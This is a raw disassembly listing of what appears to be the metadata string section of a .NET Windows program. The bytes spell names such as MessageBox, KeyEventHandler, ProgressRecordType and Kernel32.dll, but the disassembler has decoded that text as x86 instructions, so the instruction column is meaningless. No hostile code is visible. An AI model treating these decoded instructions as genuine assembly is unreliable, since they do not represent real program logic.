  4080e2:	6d                   	insl   (%dx),%es:(%edi)
  4080e3:	69 7a 65 42 6f 78 00 	imul   $0x786f42,0x65(%edx),%edi
  4080ea:	49                   	dec    %ecx
  4080eb:	42                   	inc    %edx
  4080ec:	75 74                	jne    0x408162
  4080ee:	74 6f                	je     0x40815f
  4080f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4080f1:	43                   	inc    %ebx
  4080f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4080f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4080f4:	74 72                	je     0x408168
  4080f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4080f7:	6c                   	insb   (%dx),%es:(%edi)
  4080f8:	00 73 65             	add    %dh,0x65(%ebx)
  4080fb:	74 5f                	je     0x40815c
  4080fd:	41                   	inc    %ecx
  4080fe:	63 63 65             	arpl   %esp,0x65(%ebx)
  408101:	70 74                	jo     0x408177
  408103:	42                   	inc    %edx
  408104:	75 74                	jne    0x40817a
  408106:	74 6f                	je     0x408177
  408108:	6e                   	outsb  %ds:(%esi),(%dx)
  408109:	00 73 65             	add    %dh,0x65(%ebx)
  40810c:	74 5f                	je     0x40816d
  40810e:	43                   	inc    %ebx
  40810f:	61                   	popa
  408110:	6e                   	outsb  %ds:(%esi),(%dx)
  408111:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408114:	42                   	inc    %edx
  408115:	75 74                	jne    0x40818b
  408117:	74 6f                	je     0x408188
  408119:	6e                   	outsb  %ds:(%esi),(%dx)
  40811a:	00 53 68             	add    %dl,0x68(%ebx)
  40811d:	6f                   	outsl  %ds:(%esi),(%dx)
  40811e:	77 44                	ja     0x408164
  408120:	69 61 6c 6f 67 00 67 	imul   $0x6700676f,0x6c(%ecx),%esp
  408127:	65 74 5f             	gs je  0x408189
  40812a:	54                   	push   %esp
  40812b:	65 78 74             	gs js  0x4081a2
  40812e:	00 67 65             	add    %ah,0x65(%edi)
  408131:	74 5f                	je     0x408192
  408133:	43                   	inc    %ebx
  408134:	6f                   	outsl  %ds:(%esi),(%dx)
  408135:	75 6e                	jne    0x4081a5
  408137:	74 00                	je     0x408139
  408139:	52                   	push   %edx
  40813a:	61                   	popa
  40813b:	64 69 6f 42 75 74 74 	imul   $0x6f747475,%fs:0x42(%edi),%ebp
  408142:	6f 
  408143:	6e                   	outsb  %ds:(%esi),(%dx)
  408144:	00 54 6f 6f          	add    %dl,0x6f(%edi,%ebp,2)
  408148:	6c                   	insb   (%dx),%es:(%edi)
  408149:	54                   	push   %esp
  40814a:	69 70 00 49 45 6e 75 	imul   $0x756e4549,0x0(%eax),%esi
  408151:	6d                   	insl   (%dx),%es:(%edi)
  408152:	65 72 61             	gs jb  0x4081b6
  408155:	74 6f                	je     0x4081c6
  408157:	72 60                	jb     0x4081b9
  408159:	31 00                	xor    %eax,(%eax)
  40815b:	47                   	inc    %edi
  40815c:	65 74 45             	gs je  0x4081a4
  40815f:	6e                   	outsb  %ds:(%esi),(%dx)
  408160:	75 6d                	jne    0x4081cf
  408162:	65 72 61             	gs jb  0x4081c6
  408165:	74 6f                	je     0x4081d6
  408167:	72 00                	jb     0x408169
  408169:	67 65 74 5f          	addr16 gs je 0x4081cc
  40816d:	43                   	inc    %ebx
  40816e:	75 72                	jne    0x4081e2
  408170:	72 65                	jb     0x4081d7
  408172:	6e                   	outsb  %ds:(%esi),(%dx)
  408173:	74 00                	je     0x408175
  408175:	67 65 74 5f          	addr16 gs je 0x4081d8
  408179:	4c                   	dec    %esp
  40817a:	61                   	popa
  40817b:	62 65 6c             	bound  %esp,0x6c(%ebp)
  40817e:	00 73 65             	add    %dh,0x65(%ebx)
  408181:	74 5f                	je     0x4081e2
  408183:	43                   	inc    %ebx
  408184:	68 65 63 6b 65       	push   $0x656b6365
  408189:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40818d:	74 5f                	je     0x4081ee
  40818f:	48                   	dec    %eax
  408190:	65 69 67 68 74 00 67 	imul   $0x65670074,%gs:0x68(%edi),%esp
  408197:	65 
  408198:	74 5f                	je     0x4081f9
  40819a:	48                   	dec    %eax
  40819b:	65 6c                	gs insb (%dx),%es:(%edi)
  40819d:	70 4d                	jo     0x4081ec
  40819f:	65 73 73             	gs jae 0x408215
  4081a2:	61                   	popa
  4081a3:	67 65 00 53 65       	add    %dl,%gs:0x65(%bp,%di)
  4081a8:	74 54                	je     0x4081fe
  4081aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ac:	6c                   	insb   (%dx),%es:(%edi)
  4081ad:	54                   	push   %esp
  4081ae:	69 70 00 53 79 73 74 	imul   $0x74737953,0x0(%eax),%esi
  4081b5:	65 6d                	gs insl (%dx),%es:(%edi)
  4081b7:	2e 43                	cs inc %ebx
  4081b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ba:	6c                   	insb   (%dx),%es:(%edi)
  4081bb:	6c                   	insb   (%dx),%es:(%edi)
  4081bc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4081c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c2:	73 00                	jae    0x4081c4
  4081c4:	49                   	dec    %ecx
  4081c5:	45                   	inc    %ebp
  4081c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c7:	75 6d                	jne    0x408236
  4081c9:	65 72 61             	gs jb  0x40822d
  4081cc:	74 6f                	je     0x40823d
  4081ce:	72 00                	jb     0x4081d0
  4081d0:	4d                   	dec    %ebp
  4081d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d2:	76 65                	jbe    0x408239
  4081d4:	4e                   	dec    %esi
  4081d5:	65 78 74             	gs js  0x40824c
  4081d8:	00 49 44             	add    %cl,0x44(%ecx)
  4081db:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4081e2:	6c                   	insb   (%dx),%es:(%edi)
  4081e3:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  4081e8:	70 6f                	jo     0x408259
  4081ea:	73 65                	jae    0x408251
  4081ec:	00 73 65             	add    %dh,0x65(%ebx)
  4081ef:	74 5f                	je     0x408250
  4081f1:	53                   	push   %ebx
  4081f2:	68 6f 77 41 6c       	push   $0x6c41776f
  4081f7:	77 61                	ja     0x40825a
  4081f9:	79 73                	jns    0x40826e
  4081fb:	00 67 65             	add    %ah,0x65(%edi)
  4081fe:	74 5f                	je     0x40825f
  408200:	43                   	inc    %ebx
  408201:	68 65 63 6b 65       	push   $0x656b6365
  408206:	64 00 42 79          	add    %al,%fs:0x79(%edx)
  40820a:	74 65                	je     0x408271
  40820c:	00 4b 65             	add    %cl,0x65(%ebx)
  40820f:	79 45                	jns    0x408256
  408211:	76 65                	jbe    0x408278
  408213:	6e                   	outsb  %ds:(%esi),(%dx)
  408214:	74 48                	je     0x40825e
  408216:	61                   	popa
  408217:	6e                   	outsb  %ds:(%esi),(%dx)
  408218:	64 6c                	fs insb (%dx),%es:(%edi)
  40821a:	65 72 00             	gs jb  0x40821d
  40821d:	61                   	popa
  40821e:	64 64 5f             	fs fs pop %edi
  408221:	4b                   	dec    %ebx
  408222:	65 79 44             	gs jns 0x408269
  408225:	6f                   	outsl  %ds:(%esi),(%dx)
  408226:	77 6e                	ja     0x408296
  408228:	00 61 64             	add    %ah,0x64(%ecx)
  40822b:	64 5f                	fs pop %edi
  40822d:	4b                   	dec    %ebx
  40822e:	65 79 55             	gs jns 0x408286
  408231:	70 00                	jo     0x408233
  408233:	67 65 74 5f          	addr16 gs je 0x408296
  408237:	4b                   	dec    %ebx
  408238:	65 79 56             	gs jns 0x408291
  40823b:	61                   	popa
  40823c:	6c                   	insb   (%dx),%es:(%edi)
  40823d:	75 65                	jne    0x4082a4
  40823f:	00 73 65             	add    %dh,0x65(%ebx)
  408242:	74 5f                	je     0x4082a3
  408244:	56                   	push   %esi
  408245:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  40824c:	65 79 43             	gs jns 0x408292
  40824f:	6f                   	outsl  %ds:(%esi),(%dx)
  408250:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408255:	74 5f                	je     0x4082b6
  408257:	4b                   	dec    %ebx
  408258:	65 79 43             	gs jns 0x40829e
  40825b:	6f                   	outsl  %ds:(%esi),(%dx)
  40825c:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408261:	74 5f                	je     0x4082c2
  408263:	53                   	push   %ebx
  408264:	68 69 66 74 00       	push   $0x746669
  408269:	67 65 74 5f          	addr16 gs je 0x4082cc
  40826d:	41                   	inc    %ecx
  40826e:	6c                   	insb   (%dx),%es:(%edi)
  40826f:	74 00                	je     0x408271
  408271:	67 65 74 5f          	addr16 gs je 0x4082d4
  408275:	43                   	inc    %ebx
  408276:	6f                   	outsl  %ds:(%esi),(%dx)
  408277:	6e                   	outsb  %ds:(%esi),(%dx)
  408278:	74 72                	je     0x4082ec
  40827a:	6f                   	outsl  %ds:(%esi),(%dx)
  40827b:	6c                   	insb   (%dx),%es:(%edi)
  40827c:	00 67 65             	add    %ah,0x65(%edi)
  40827f:	74 5f                	je     0x4082e0
  408281:	43                   	inc    %ebx
  408282:	68 61 72 73 00       	push   $0x737261
  408287:	73 65                	jae    0x4082ee
  408289:	74 5f                	je     0x4082ea
  40828b:	43                   	inc    %ebx
  40828c:	68 61 72 61 63       	push   $0x63617261
  408291:	74 65                	je     0x4082f8
  408293:	72 00                	jb     0x408295
  408295:	73 65                	jae    0x4082fc
  408297:	74 5f                	je     0x4082f8
  408299:	4b                   	dec    %ebx
  40829a:	65 79 44             	gs jns 0x4082e1
  40829d:	6f                   	outsl  %ds:(%esi),(%dx)
  40829e:	77 6e                	ja     0x40830e
  4082a0:	00 43 6f             	add    %al,0x6f(%ebx)
  4082a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4082a4:	74 72                	je     0x408318
  4082a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a7:	6c                   	insb   (%dx),%es:(%edi)
  4082a8:	4b                   	dec    %ebx
  4082a9:	65 79 53             	gs jns 0x4082ff
  4082ac:	74 61                	je     0x40830f
  4082ae:	74 65                	je     0x408315
  4082b0:	73 00                	jae    0x4082b2
  4082b2:	73 65                	jae    0x408319
  4082b4:	74 5f                	je     0x408315
  4082b6:	43                   	inc    %ebx
  4082b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4082b9:	74 72                	je     0x40832d
  4082bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4082bc:	6c                   	insb   (%dx),%es:(%edi)
  4082bd:	4b                   	dec    %ebx
  4082be:	65 79 53             	gs jns 0x408314
  4082c1:	74 61                	je     0x408324
  4082c3:	74 65                	je     0x40832a
  4082c5:	00 67 65             	add    %ah,0x65(%edi)
  4082c8:	74 5f                	je     0x408329
  4082ca:	43                   	inc    %ebx
  4082cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4082cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cd:	74 72                	je     0x408341
  4082cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	4b                   	dec    %ebx
  4082d2:	65 79 53             	gs jns 0x408328
  4082d5:	74 61                	je     0x408338
  4082d7:	74 65                	je     0x40833e
  4082d9:	00 67 65             	add    %ah,0x65(%edi)
  4082dc:	74 5f                	je     0x40833d
  4082de:	4d                   	dec    %ebp
  4082df:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e0:	64 69 66 69 65 72 73 	imul   $0x737265,%fs:0x69(%esi),%esp
  4082e7:	00 
  4082e8:	67 65 74 5f          	addr16 gs je 0x40834b
  4082ec:	42                   	inc    %edx
  4082ed:	6c                   	insb   (%dx),%es:(%edi)
  4082ee:	61                   	popa
  4082ef:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4082f2:	67 65 74 5f          	addr16 gs je 0x408355
  4082f6:	42                   	inc    %edx
  4082f7:	6c                   	insb   (%dx),%es:(%edi)
  4082f8:	75 65                	jne    0x40835f
  4082fa:	00 67 65             	add    %ah,0x65(%edi)
  4082fd:	74 5f                	je     0x40835e
  4082ff:	43                   	inc    %ebx
  408300:	79 61                	jns    0x408363
  408302:	6e                   	outsb  %ds:(%esi),(%dx)
  408303:	00 43 6f             	add    %al,0x6f(%ebx)
  408306:	6c                   	insb   (%dx),%es:(%edi)
  408307:	6f                   	outsl  %ds:(%esi),(%dx)
  408308:	72 54                	jb     0x40835e
  40830a:	72 61                	jb     0x40836d
  40830c:	6e                   	outsb  %ds:(%esi),(%dx)
  40830d:	73 6c                	jae    0x40837b
  40830f:	61                   	popa
  408310:	74 6f                	je     0x408381
  408312:	72 00                	jb     0x408314
  408314:	46                   	inc    %esi
  408315:	72 6f                	jb     0x408386
  408317:	6d                   	insl   (%dx),%es:(%edi)
  408318:	48                   	dec    %eax
  408319:	74 6d                	je     0x408388
  40831b:	6c                   	insb   (%dx),%es:(%edi)
  40831c:	00 67 65             	add    %ah,0x65(%edi)
  40831f:	74 5f                	je     0x408380
  408321:	4d                   	dec    %ebp
  408322:	61                   	popa
  408323:	67 65 6e             	outsb  %gs:(%si),(%dx)
  408326:	74 61                	je     0x408389
  408328:	00 67 65             	add    %ah,0x65(%edi)
  40832b:	74 5f                	je     0x40838c
  40832d:	52                   	push   %edx
  40832e:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  408333:	74 5f                	je     0x408394
  408335:	57                   	push   %edi
  408336:	68 69 74 65 00       	push   $0x657469
  40833b:	67 65 74 5f          	addr16 gs je 0x40839e
  40833f:	59                   	pop    %ecx
  408340:	65 6c                	gs insb (%dx),%es:(%edi)
  408342:	6c                   	insb   (%dx),%es:(%edi)
  408343:	6f                   	outsl  %ds:(%esi),(%dx)
  408344:	77 00                	ja     0x408346
  408346:	53                   	push   %ebx
  408347:	75 73                	jne    0x4083bc
  408349:	70 65                	jo     0x4083b0
  40834b:	6e                   	outsb  %ds:(%esi),(%dx)
  40834c:	64 4c                	fs dec %esp
  40834e:	61                   	popa
  40834f:	79 6f                	jns    0x4083c0
  408351:	75 74                	jne    0x4083c7
  408353:	00 53 63             	add    %dl,0x63(%ebx)
  408356:	72 6f                	jb     0x4083c7
  408358:	6c                   	insb   (%dx),%es:(%edi)
  408359:	6c                   	insb   (%dx),%es:(%edi)
  40835a:	61                   	popa
  40835b:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  40835f:	6f                   	outsl  %ds:(%esi),(%dx)
  408360:	6e                   	outsb  %ds:(%esi),(%dx)
  408361:	74 72                	je     0x4083d5
  408363:	6f                   	outsl  %ds:(%esi),(%dx)
  408364:	6c                   	insb   (%dx),%es:(%edi)
  408365:	00 73 65             	add    %dh,0x65(%ebx)
  408368:	74 5f                	je     0x4083c9
  40836a:	41                   	inc    %ecx
  40836b:	75 74                	jne    0x4083e1
  40836d:	6f                   	outsl  %ds:(%esi),(%dx)
  40836e:	53                   	push   %ebx
  40836f:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408372:	6c                   	insb   (%dx),%es:(%edi)
  408373:	6c                   	insb   (%dx),%es:(%edi)
  408374:	00 73 65             	add    %dh,0x65(%ebx)
  408377:	74 5f                	je     0x4083d8
  408379:	42                   	inc    %edx
  40837a:	61                   	popa
  40837b:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  40837e:	6f                   	outsl  %ds:(%esi),(%dx)
  40837f:	6c                   	insb   (%dx),%es:(%edi)
  408380:	6f                   	outsl  %ds:(%esi),(%dx)
  408381:	72 00                	jb     0x408383
  408383:	73 65                	jae    0x4083ea
  408385:	74 5f                	je     0x4083e6
  408387:	43                   	inc    %ebx
  408388:	6f                   	outsl  %ds:(%esi),(%dx)
  408389:	6e                   	outsb  %ds:(%esi),(%dx)
  40838a:	74 72                	je     0x4083fe
  40838c:	6f                   	outsl  %ds:(%esi),(%dx)
  40838d:	6c                   	insb   (%dx),%es:(%edi)
  40838e:	42                   	inc    %edx
  40838f:	6f                   	outsl  %ds:(%esi),(%dx)
  408390:	78 00                	js     0x408392
  408392:	52                   	push   %edx
  408393:	65 73 75             	gs jae 0x40840b
  408396:	6d                   	insl   (%dx),%es:(%edi)
  408397:	65 4c                	gs dec %esp
  408399:	61                   	popa
  40839a:	79 6f                	jns    0x40840b
  40839c:	75 74                	jne    0x408412
  40839e:	00 45 6c             	add    %al,0x6c(%ebp)
  4083a1:	61                   	popa
  4083a2:	70 73                	jo     0x408417
  4083a4:	65 64 45             	gs fs inc %ebp
  4083a7:	76 65                	jbe    0x40840e
  4083a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083aa:	74 48                	je     0x4083f4
  4083ac:	61                   	popa
  4083ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ae:	64 6c                	fs insb (%dx),%es:(%edi)
  4083b0:	65 72 00             	gs jb  0x4083b3
  4083b3:	61                   	popa
  4083b4:	64 64 5f             	fs fs pop %edi
  4083b7:	45                   	inc    %ebp
  4083b8:	6c                   	insb   (%dx),%es:(%edi)
  4083b9:	61                   	popa
  4083ba:	70 73                	jo     0x40842f
  4083bc:	65 64 00 73 65       	gs add %dh,%fs:0x65(%ebx)
  4083c1:	74 5f                	je     0x408422
  4083c3:	49                   	dec    %ecx
  4083c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c5:	74 65                	je     0x40842c
  4083c7:	72 76                	jb     0x40843f
  4083c9:	61                   	popa
  4083ca:	6c                   	insb   (%dx),%es:(%edi)
  4083cb:	00 73 65             	add    %dh,0x65(%ebx)
  4083ce:	74 5f                	je     0x40842f
  4083d0:	41                   	inc    %ecx
  4083d1:	75 74                	jne    0x408447
  4083d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083d4:	52                   	push   %edx
  4083d5:	65 73 65             	gs jae 0x40843d
  4083d8:	74 00                	je     0x4083da
  4083da:	53                   	push   %ebx
  4083db:	74 61                	je     0x40843e
  4083dd:	72 74                	jb     0x408453
  4083df:	00 67 65             	add    %ah,0x65(%edi)
  4083e2:	74 5f                	je     0x408443
  4083e4:	49                   	dec    %ecx
  4083e5:	74 65                	je     0x40844c
  4083e7:	6d                   	insl   (%dx),%es:(%edi)
  4083e8:	00 73 65             	add    %dh,0x65(%ebx)
  4083eb:	74 5f                	je     0x40844c
  4083ed:	56                   	push   %esi
  4083ee:	61                   	popa
  4083ef:	6c                   	insb   (%dx),%es:(%edi)
  4083f0:	75 65                	jne    0x408457
  4083f2:	00 52 65             	add    %dl,0x65(%edx)
  4083f5:	66 72 65             	data16 jb 0x40845d
  4083f8:	73 68                	jae    0x408462
  4083fa:	00 73 65             	add    %dh,0x65(%ebx)
  4083fd:	74 5f                	je     0x40845e
  4083ff:	4c                   	dec    %esp
  408400:	65 66 74 00          	gs data16 je 0x408404
  408404:	73 65                	jae    0x40846b
  408406:	74 5f                	je     0x408467
  408408:	54                   	push   %esp
  408409:	6f                   	outsl  %ds:(%esi),(%dx)
  40840a:	70 00                	jo     0x40840c
  40840c:	46                   	inc    %esi
  40840d:	6f                   	outsl  %ds:(%esi),(%dx)
  40840e:	6e                   	outsb  %ds:(%esi),(%dx)
  40840f:	74 00                	je     0x408411
  408411:	67 65 74 5f          	addr16 gs je 0x408474
  408415:	46                   	inc    %esi
  408416:	6f                   	outsl  %ds:(%esi),(%dx)
  408417:	6e                   	outsb  %ds:(%esi),(%dx)
  408418:	74 00                	je     0x40841a
  40841a:	46                   	inc    %esi
  40841b:	6f                   	outsl  %ds:(%esi),(%dx)
  40841c:	6e                   	outsb  %ds:(%esi),(%dx)
  40841d:	74 53                	je     0x408472
  40841f:	74 79                	je     0x40849a
  408421:	6c                   	insb   (%dx),%es:(%edi)
  408422:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408426:	74 5f                	je     0x408487
  408428:	46                   	inc    %esi
  408429:	6f                   	outsl  %ds:(%esi),(%dx)
  40842a:	6e                   	outsb  %ds:(%esi),(%dx)
  40842b:	74 00                	je     0x40842d
  40842d:	50                   	push   %eax
  40842e:	72 6f                	jb     0x40849f
  408430:	67 72 65             	addr16 jb 0x408498
  408433:	73 73                	jae    0x4084a8
  408435:	42                   	inc    %edx
  408436:	61                   	popa
  408437:	72 53                	jb     0x40848c
  408439:	74 79                	je     0x4084b4
  40843b:	6c                   	insb   (%dx),%es:(%edi)
  40843c:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408440:	74 5f                	je     0x4084a1
  408442:	53                   	push   %ebx
  408443:	74 79                	je     0x4084be
  408445:	6c                   	insb   (%dx),%es:(%edi)
  408446:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40844a:	74 5f                	je     0x4084ab
  40844c:	46                   	inc    %esi
  40844d:	6f                   	outsl  %ds:(%esi),(%dx)
  40844e:	72 65                	jb     0x4084b5
  408450:	43                   	inc    %ebx
  408451:	6f                   	outsl  %ds:(%esi),(%dx)
  408452:	6c                   	insb   (%dx),%es:(%edi)
  408453:	6f                   	outsl  %ds:(%esi),(%dx)
  408454:	72 00                	jb     0x408456
  408456:	73 65                	jae    0x4084bd
  408458:	74 5f                	je     0x4084b9
  40845a:	53                   	push   %ebx
  40845b:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408462:	5f                   	pop    %edi
  408463:	41                   	inc    %ecx
  408464:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408468:	69 74 79 49 64 00 50 	imul   $0x72500064,0x49(%ecx,%edi,2),%esi
  40846f:	72 
  408470:	6f                   	outsl  %ds:(%esi),(%dx)
  408471:	67 72 65             	addr16 jb 0x4084d9
  408474:	73 73                	jae    0x4084e9
  408476:	52                   	push   %edx
  408477:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40847b:	64 54                	fs push %esp
  40847d:	79 70                	jns    0x4084ef
  40847f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408483:	74 5f                	je     0x4084e4
  408485:	52                   	push   %edx
  408486:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40848a:	64 54                	fs push %esp
  40848c:	79 70                	jns    0x4084fe
  40848e:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408492:	6d                   	insl   (%dx),%es:(%edi)
  408493:	6f                   	outsl  %ds:(%esi),(%dx)
  408494:	76 65                	jbe    0x4084fb
  408496:	00 53 79             	add    %dl,0x79(%ebx)
  408499:	73 74                	jae    0x40850f
  40849b:	65 6d                	gs insl (%dx),%es:(%edi)
  40849d:	2e 43                	cs inc %ebx
  40849f:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a0:	6d                   	insl   (%dx),%es:(%edi)
  4084a1:	70 6f                	jo     0x408512
  4084a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4084a6:	74 4d                	je     0x4084f5
  4084a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a9:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4084ac:	00 43 6f             	add    %al,0x6f(%ebx)
  4084af:	6d                   	insl   (%dx),%es:(%edi)
  4084b0:	70 6f                	jo     0x408521
  4084b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4084b3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4084b5:	74 00                	je     0x4084b7
  4084b7:	52                   	push   %edx
  4084b8:	65 6d                	gs insl (%dx),%es:(%edi)
  4084ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4084bb:	76 65                	jbe    0x408522
  4084bd:	41                   	inc    %ecx
  4084be:	74 00                	je     0x4084c0
  4084c0:	53                   	push   %ebx
  4084c1:	74 6f                	je     0x408532
  4084c3:	70 00                	jo     0x4084c5
  4084c5:	67 65 74 5f          	addr16 gs je 0x408528
  4084c9:	50                   	push   %eax
  4084ca:	61                   	popa
  4084cb:	72 65                	jb     0x408532
  4084cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ce:	74 41                	je     0x408511
  4084d0:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4084d4:	69 74 79 49 64 00 49 	imul   $0x6e490064,0x49(%ecx,%edi,2),%esi
  4084db:	6e 
  4084dc:	73 65                	jae    0x408543
  4084de:	72 74                	jb     0x408554
  4084e0:	00 67 65             	add    %ah,0x65(%edi)
  4084e3:	74 5f                	je     0x408544
  4084e5:	41                   	inc    %ecx
  4084e6:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4084ea:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  4084f1:	5f 
  4084f2:	53                   	push   %ebx
  4084f3:	74 61                	je     0x408556
  4084f5:	74 75                	je     0x40856c
  4084f7:	73 44                	jae    0x40853d
  4084f9:	65 73 63             	gs jae 0x40855f
  4084fc:	72 69                	jb     0x408567
  4084fe:	70 74                	jo     0x408574
  408500:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  408507:	5f                   	pop    %edi
  408508:	50                   	push   %eax
  408509:	65 72 63             	gs jb  0x40856f
  40850c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40850e:	74 43                	je     0x408553
  408510:	6f                   	outsl  %ds:(%esi),(%dx)
  408511:	6d                   	insl   (%dx),%es:(%edi)
  408512:	70 6c                	jo     0x408580
  408514:	65 74 65             	gs je  0x40857c
  408517:	00 67 65             	add    %ah,0x65(%edi)
  40851a:	74 5f                	je     0x40857b
  40851c:	53                   	push   %ebx
  40851d:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408521:	64 73 52             	fs jae 0x408576
  408524:	65 6d                	gs insl (%dx),%es:(%edi)
  408526:	61                   	popa
  408527:	69 6e 69 6e 67 00 54 	imul   $0x5400676e,0x69(%esi),%ebp
  40852e:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  408535:	00 67 65             	add    %ah,0x65(%edi)
  408538:	74 5f                	je     0x408599
  40853a:	54                   	push   %esp
  40853b:	6f                   	outsl  %ds:(%esi),(%dx)
  40853c:	74 61                	je     0x40859f
  40853e:	6c                   	insb   (%dx),%es:(%edi)
  40853f:	48                   	dec    %eax
  408540:	6f                   	outsl  %ds:(%esi),(%dx)
  408541:	75 72                	jne    0x4085b5
  408543:	73 00                	jae    0x408545
  408545:	49                   	dec    %ecx
  408546:	6e                   	outsb  %ds:(%esi),(%dx)
  408547:	74 33                	je     0x40857c
  408549:	32 00                	xor    (%eax),%al
  40854b:	67 65 74 5f          	addr16 gs je 0x4085ae
  40854f:	4d                   	dec    %ebp
  408550:	69 6e 75 74 65 73 00 	imul   $0x736574,0x75(%esi),%ebp
  408557:	67 65 74 5f          	addr16 gs je 0x4085ba
  40855b:	53                   	push   %ebx
  40855c:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408560:	64 73 00             	fs jae 0x408563
  408563:	46                   	inc    %esi
  408564:	6f                   	outsl  %ds:(%esi),(%dx)
  408565:	72 6d                	jb     0x4085d4
  408567:	61                   	popa
  408568:	74 00                	je     0x40856a
  40856a:	43                   	inc    %ebx
  40856b:	6f                   	outsl  %ds:(%esi),(%dx)
  40856c:	6e                   	outsb  %ds:(%esi),(%dx)
  40856d:	63 61 74             	arpl   %esp,0x74(%ecx)
  408570:	00 67 65             	add    %ah,0x65(%edi)
  408573:	74 5f                	je     0x4085d4
  408575:	43                   	inc    %ebx
  408576:	75 72                	jne    0x4085ea
  408578:	72 65                	jb     0x4085df
  40857a:	6e                   	outsb  %ds:(%esi),(%dx)
  40857b:	74 4f                	je     0x4085cc
  40857d:	70 65                	jo     0x4085e4
  40857f:	72 61                	jb     0x4085e2
  408581:	74 69                	je     0x4085ec
  408583:	6f                   	outsl  %ds:(%esi),(%dx)
  408584:	6e                   	outsb  %ds:(%esi),(%dx)
  408585:	00 41 70             	add    %al,0x70(%ecx)
  408588:	70 6c                	jo     0x4085f6
  40858a:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408591:	00 44 6f 45          	add    %al,0x45(%edi,%ebp,2)
  408595:	76 65                	jbe    0x4085fc
  408597:	6e                   	outsb  %ds:(%esi),(%dx)
  408598:	74 73                	je     0x40860d
  40859a:	00 4b 65             	add    %cl,0x65(%ebx)
  40859d:	72 6e                	jb     0x40860d
  40859f:	65 6c                	gs insb (%dx),%es:(%edi)
  4085a1:	33 32                	xor    (%edx),%esi
  4085a3:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4085a6:	6c                   	insb   (%dx),%es:(%edi)
  4085a7:	00 4d 65             	add    %cl,0x65(%ebp)
  4085aa:	73 73                	jae    0x40861f
  4085ac:	61                   	popa
  4085ad:	67 65 42             	addr16 gs inc %edx
  4085b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b1:	78 00                	js     0x4085b3
  4085b3:	67 65 74 5f          	addr16 gs je 0x408616
  4085b7:	50                   	push   %eax
  4085b8:	61                   	popa
  4085b9:	72 61                	jb     0x40861c
  4085bb:	6d                   	insl   (%dx),%es:(%edi)
  4085bc:	65 74 65             	gs je  0x408624
  4085bf:	72 41                	jb     0x408602
  4085c1:	73 73                	jae    0x408636
  4085c3:	65 6d                	gs insl (%dx),%es:(%edi)
  4085c5:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4085c9:	75 6c                	jne    0x408637
  4085cb:	6c                   	insb   (%dx),%es:(%edi)
  4085cc:	4e                   	dec    %esi
  4085cd:	61                   	popa
